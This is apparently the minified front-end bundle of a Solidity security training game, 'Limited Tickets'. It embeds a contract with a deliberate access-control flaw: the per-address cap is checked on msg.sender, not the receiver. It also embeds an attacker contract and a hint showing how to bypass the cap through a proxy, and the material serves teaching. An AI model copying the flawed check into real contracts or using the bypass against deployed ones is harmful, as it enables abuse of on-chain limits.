(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[805],{55971:function(e,t,a){(window.__NEXT_P=window.__NEXT_P||[]).push(["/games/Game16",function(){return a(80335)}])},83545:function(e,t,a){"use strict";var s=a(85893),n=a(67294),i=a(53637),c=a(39886),r=a(54610),o=a(84082),l=a(49816),d=a(89163),u=a(87261),m=a(45281),h=a(84283),p=a(74855),k=a(44173),x=a(96941);a(71399);var g=a(46050);t.Z=e=>{let{gameData:t,gameFunctions:a}=e,[y,f]=(0,n.useState)({}),[b,T]=(0,n.useState)(""),[j,C]=(0,n.useState)(""),[w,A]=(0,n.useState)(""),[N,Z]=(0,n.useState)(!1),[v,S]=(0,n.useState)(null),[E,B]=(0,n.useState)(null),[_,P]=(0,n.useState)(!1),[H,I]=(0,n.useState)(null),L=(0,n.useRef)(null),{walletAddress:F,factoryContract:M,nftContract:Y,web3:G}=(0,n.useContext)(g.S);(0,n.useEffect)(()=>{G&&G.utils.isAddress(b)&&S(new G.eth.Contract(t.abi,b)),G&&t.abi2&&G.utils.isAddress(j)&&B(new G.eth.Contract(t.abi2,j))},[b,j,G,t.abi,t.abi2]),(0,n.useEffect)(()=>{let e=async()=>{if(F&&Y){let e=await Y.methods.balanceOf(F,t.badgeId).call();A(e)}};e()},[F,Y,t.badgeId]);let O=(e,t)=>{f({...y,[t]:e.target.value})},D=async()=>{try{Z(!0);let e=await M.methods.deploy(t.id).send({from:F}),a=e.events.DeployInstance;a?(T(G.utils.toChecksumAddress("0x".concat(e.logs[0].topics[1].slice(-40)))),t.abi2&&e.logs[1]&&C(G.utils.toChecksumAddress("0x".concat(e.logs[1].topics[1].slice(-40)))),t.showTransactionHash&&I(e.transactionHash),k.Am.success("Game instance(s) created successfully!")):k.Am.error("Game creation failed.")}catch(e){k.Am.error("Game creation failed. Please ensure your wallet is connected."),console.error(e)}finally{Z(!1)}},z=(e,a)=>{a(k.Am,v,y,F,Y,t.badgeId,G,E)};return(0,s.jsxs)(i.Z,{className:"bg-primary-black overflow-hidden",style:{paddingBottom:"30px",minHeight:"100vh"},children:[(0,s.jsx)(x.wp,{}),(0,s.jsx)(k.Ix,{}),(0,s.jsx)("h1",{className:"game-title title-color",style:{paddingTop:"20px",paddingBottom:"20px"},children:(0,s.jsx)("b",{children:t.title})}),(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,s.jsx)(r.Z,{children:(0,s.jsxs)("div",{children:[(0,s.jsx)(p.CopyToClipboard,{text:t.code,children:(0,s.jsx)(o.Z,{className:"button-copy",children:"Copy code"})}),(0,s.jsx)(m.Z,{language:"javascript",style:h.YC,ref:L,customStyle:{margin:"0"},children:t.code})]})})}),t.code1&&(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,s.jsx)(r.Z,{children:(0,s.jsxs)("div",{children:[(0,s.jsx)(p.CopyToClipboard,{text:t.code1,children:(0,s.jsx)(o.Z,{className:"button-copy",children:"Copy code"})}),(0,s.jsx)(m.Z,{style:h.YC,ref:L,customStyle:{margin:"0"},children:t.code1})]})})}),(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,s.jsxs)(r.Z,{children:[(0,s.jsx)(l.Z,{className:"desc-title title-color",children:(0,s.jsx)("b",{children:"Game Description"})}),(0,s.jsx)("p",{children:t.description}),(0,s.jsx)("br",{}),(0,s.jsx)(o.Z,{onClick:D,className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#c97539",color:"white"},children:N?"Creating...":"Create Instance"})]})}),b&&!N&&(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,s.jsxs)(r.Z,{children:[(0,s.jsx)("h3",{className:"desc-title title-color",children:(0,s.jsx)("b",{children:"Your Instance Address:"})}),(0,s.jsx)("p",{style:{wordBreak:"break-all",color:"#c97539"},children:b}),E&&(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)("h3",{className:"desc-title title-color",children:(0,s.jsx)("b",{children:"Your Hacking Instance Address:"})}),(0,s.jsx)("p",{style:{wordBreak:"break-all",color:"#c97539"},children:j})]})]})}),b&&!N&&t.hint&&(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(o.Z,{onClick:()=>P(!_),className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#355f7d",color:"white",marginBottom:"17px",marginLeft:"12px"},children:_?"Hide Hint":"Show Hint"}),_&&(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginTop:"10px"},children:(0,s.jsxs)(r.Z,{children:[(0,s.jsx)(l.Z,{className:"desc-title title-color",children:(0,s.jsx)("b",{children:"Hint"})}),(0,s.jsxs)("p",{children:[t.hint,t.showTransactionHash&&H&&(0,s.jsxs)("span",{children:[" ",H,"."]})]})]})})]}),b&&!N&&t.functions.map((e,t)=>(0,s.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,s.jsxs)(r.Z,{children:[(0,s.jsx)(l.Z,{className:"desc-title title-color",children:(0,s.jsx)("b",{children:e.label})}),e.inputs.map((e,t)=>(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(d.Z,{children:(0,s.jsx)(u.Z,{className:"py-1 rounded-[12px]",style:{color:"black"},placeholder:e.placeholder,onChange:t=>O(t,e.name)})},t),(0,s.jsx)("br",{})]})),(0,s.jsx)(o.Z,{className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#355f7d",color:"white"},onClick:()=>z(e.functionName,a[e.functionName]),children:e.buttonText})]})},t)),w>0&&(0,s.jsx)("div",{style:{textAlign:"center",color:"#c97539",marginTop:"20px"},children:(0,s.jsxs)("strong",{children:["Congratulations! You Got A Badge ",(0,s.jsx)("i",{className:"fas fa-medal",style:{fontSize:"20px"}})]})})]})}},80335:function(e,t,a){"use strict";a.r(t),a.d(t,{default:function(){return h}});var s=a(85893);a(67294);var n=a(83545),i=JSON.parse('[{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"Count","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"ticketAmount","type":"uint256"}],"name":"claimTickets","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"maxTicketsPerAddress","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"}]'),c=JSON.parse('[{"inputs":[{"internalType":"address","name":"_target","type":"address"},{"internalType":"address","name":"attacker","type":"address"},{"internalType":"uint256","name":"ticketAmount","type":"uint256"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]');let r=async(e,t,a,s)=>{let{receiver:n,ticketAmount:i}=a;try{await t.methods.claimTickets(n,i).send({from:s}),e.success("Claiming was completed successfully!")}catch(t){console.error("Error in claimTickets function:",t),e.error("Claiming tickets failed.")}},o=async(e,t,a)=>{let{inputCounter:s}=a;try{let a=await t.methods.Count(s).call();e.info("Ticket Count for ".concat(s,": ").concat(a))}catch(t){console.error("Error in Count function:",t),e.error("Fetching ticket count failed.")}},l=async(e,t)=>{try{let a=await t.methods.maxTicketsPerAddress().call();console.log(a),e.info("Max Tickets Per Address: ".concat(a))}catch(t){console.error("Error in maxTicketsPerAddress function:",t),e.error("Fetching max tickets per address failed.")}},d=async(e,t,a,s,n,i,c,r)=>{let{target:o,attacker:l,ticketAmount:d}=a;try{await r.methods.attack(o,l,d).send({from:s}),e.success("Attack executed! ".concat(d," tickets attempted to claim."))}catch(t){console.error("Error in attack function:",t),e.error("Attack failed.")}},u=async(e,t,a,s,n,i)=>{try{let a=await t.methods.Count(s).call();if(a>3){e.success("Congratulations! You met the ticket requirement!");let a=await n.methods.balanceOf(s,i).call();a<1&&(await n.methods.mint(i,t.options.address).send({from:s}),e.success("Badge minted successfully!"))}else e.error("You don't have enough tickets.")}catch(t){console.error("Error in checkLimitedTickets function:",t),e.error("Checking limited tickets failed.")}},m={id:16,title:"Limited Tickets",description:"Strategize and bypass ticket limitations in Solidity. Challenge the system and claim rewards.\n                To play this game, you must creatively explore communication with the ticketing contract, \n                understanding how to potentially bypass a limitation that restricts users to three tickets.",code:'// SPDX-License-Identifier: MIT\n          pragma solidity ^0.8.10;\n          \n          contract LimitedTickets {\n              mapping(address => uint256) public Count;\n              uint8 public maxTicketsPerAddress = 3;\n\n              function claimTickets(address receiver, uint256 ticketAmount) public {\n                  require(\n                      Count[msg.sender] + ticketAmount <= maxTicketsPerAddress,\n                      "max tickets per address exceeded"\n                  );\n                  for (uint256 i = 0; i < ticketAmount; i++) {\n                      Count[receiver]++;\n                  }\n              }\n          }\n          \n          contract HacklimitedTickets {\n              LimitedTickets target;\n\n              function attack(address _target, address attacker, uint256 ticketAmount) public {\n                  target = LimitedTickets(_target);\n                  target.claimTickets(attacker, ticketAmount);\n              }\n          }',abi:i,abi2:c,badgeId:16,hint:"Consider how the 'claimTickets' function tracks ticket count. When the attacker contract calls this function, \n         it's defined as the msg.sender. Even though the tickets are transferred to your address through the attacker contract, \n         the balance of the attacker contract will always remain at zero tickets.",functions:[{label:"Count Tickets",functionName:"Count",buttonText:"Fetch Ticket Count",inputs:[{name:"inputCounter",placeholder:"Enter Address"}]},{label:"Max Tickets Per Address",functionName:"maxTicketsPerAddress",buttonText:"Fetch Max Tickets",inputs:[]},{label:"Claim Tickets",functionName:"claimTickets",buttonText:"Claim Tickets",inputs:[{name:"receiver",placeholder:"Enter Receiver Address"},{name:"ticketAmount",placeholder:"Enter Ticket Amount"}]},{label:"Hack Limited Tickets",functionName:"attack",buttonText:"Perform Attack",inputs:[{name:"target",placeholder:"Enter Target Address"},{name:"attacker",placeholder:"Enter Attacker Address"},{name:"ticketAmount",placeholder:"Enter Ticket Amount"}]},{label:"Check Limited Tickets",functionName:"checkLimitedTickets",buttonText:"Submit",inputs:[]}]};var h=()=>(0,s.jsx)(n.Z,{gameData:m,gameFunctions:{claimTickets:r,Count:o,maxTicketsPerAddress:l,attack:d,checkLimitedTickets:u}})}},function(e){e.O(0,[817,311,941,774,888,179],function(){return e(e.s=55971)}),_N_E=e.O()}]);